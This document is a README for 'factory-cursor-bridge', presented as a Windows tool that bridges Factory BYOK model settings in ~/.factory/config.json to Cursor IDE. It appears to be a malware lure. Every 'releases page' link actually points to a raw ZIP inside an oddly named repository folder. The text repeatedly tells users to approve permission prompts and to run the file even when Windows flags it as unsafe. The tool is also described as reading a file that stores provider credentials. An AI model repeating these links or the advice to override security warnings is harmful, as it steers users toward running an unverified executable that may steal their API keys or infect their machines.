# 🧩 factory-cursor-bridge - Use Your Factory Models in Cursor

[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)

## 🚀 What this does

factory-cursor-bridge connects your local `~/.factory/config.json` model setup to Cursor IDE.

It helps you use the same BYOK model settings in Cursor without rebuilding your setup by hand. If you already use Factory for model access, this tool acts as a bridge so Cursor can use those models with less work.

## 💾 Download for Windows

1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
2. Find the latest release.
3. Download the Windows file for your system.
4. If the download is a ZIP file, extract it first.
5. Open the app file or installer from the extracted folder.

## 🛠️ Before You Start

You need:

- A Windows PC
- Cursor IDE installed
- A Factory config file at `~/.factory/config.json`
- Access to the model provider you want to use
- A stable internet connection

If you do not know where your Factory config file is, check the Factory app or the folder in your user profile that stores its settings.

## 📦 How to Set It Up

1. Download the Windows release from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
2. Open the downloaded file.
3. If Windows asks for permission, choose Yes.
4. Follow the on-screen steps.
5. Start Cursor IDE.
6. Open the bridge tool if it does not start on its own.
7. Make sure it can read your Factory config file.
8. Use Cursor as usual and select the model setup you want through the bridge.

## 🖱️ First Run

When you open factory-cursor-bridge for the first time, it will look for your Factory config file.

If it finds `~/.factory/config.json`, it uses those model entries to connect Cursor to the right setup.

If Cursor does not show the models right away, close Cursor and open it again.

## 🔧 Typical Use

Use this app when you want:

- One model setup for both Factory and Cursor
- Less manual setup in Cursor
- A single place to manage BYOK model access
- A simpler path from local config to the IDE you already use

## 🧭 How It Works

factory-cursor-bridge reads your Factory config and maps those model settings into Cursor.

In plain terms:

- Factory keeps your model config
- The bridge reads that config
- Cursor uses the bridged setup
- You keep one shared model path instead of two separate setups

## 🪟 Windows Tips

- Keep the app in a folder you can find easily, like `Downloads` or `Desktop`
- If Windows blocks the file, right-click it and choose Open
- If the app closes too fast, run it again from the same folder
- Keep Cursor closed while you finish the first setup if you run into file access issues

## 🔍 What You Should See

After setup, you should be able to:

- Open Cursor
- Choose the connected model setup
- Use your Factory-backed models inside the editor
- Keep your config in one place

If the model list looks wrong, check that your `config.json` file has the model entries you expect.

## 🧩 Common Issues

### Cursor does not show my models

- Close Cursor
- Open factory-cursor-bridge again
- Check that `~/.factory/config.json` exists
- Make sure the config file has valid model entries

### The app cannot find my config

- Confirm the file path is correct
- Make sure the file is named `config.json`
- Check that the Factory folder is in your user profile
- Try moving the app to a normal local folder like `Desktop`

### Windows says the file is unsafe

- Download it again from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)
- Open the file from the extracted folder
- If needed, right-click the file and allow it to run

### Cursor still uses old settings

- Restart Cursor
- Restart the bridge tool
- Check whether another config is overriding your Factory settings

## 📁 Folder and File Layout

The bridge expects this kind of setup:

- `~/.factory/`  
  Your Factory settings folder

- `~/.factory/config.json`  
  Your model config file

- Cursor IDE  
  The app that uses the bridged model settings

You do not need to move your whole Factory setup. The bridge works with the config file you already use.

## 🧠 Best Results

Use a clean config file with the model names you want Cursor to see.

Keep backups of your Factory config before changing it.

If you test more than one model provider, change one thing at a time so you can tell what worked.

## 🗂️ Basic Use Cases

- Use your local Factory model config in Cursor
- Keep one BYOK setup across tools
- Avoid repeating model settings in more than one app
- Make Cursor follow your existing model list

## ⌨️ File Access Checklist

Before you open the app, check these items:

- The release file is downloaded
- The file is extracted if it came as a ZIP
- Cursor is installed
- `~/.factory/config.json` exists
- The config file has the models you want
- Windows lets the app run

## 🔄 Update the App

To get the latest version:

1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
2. Download the newest Windows file.
3. Replace the old file with the new one if needed.
4. Open the new version.
5. Recheck your Factory config if the model list changes

## 🧾 What This Repo Is For

This repo gives Windows users a way to connect Factory model settings to Cursor IDE through a shared bridge.

It fits users who already rely on `~/.factory/config.json` and want Cursor to use the same setup with less manual work

## 🔗 Download Again

If you need the file again, use the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)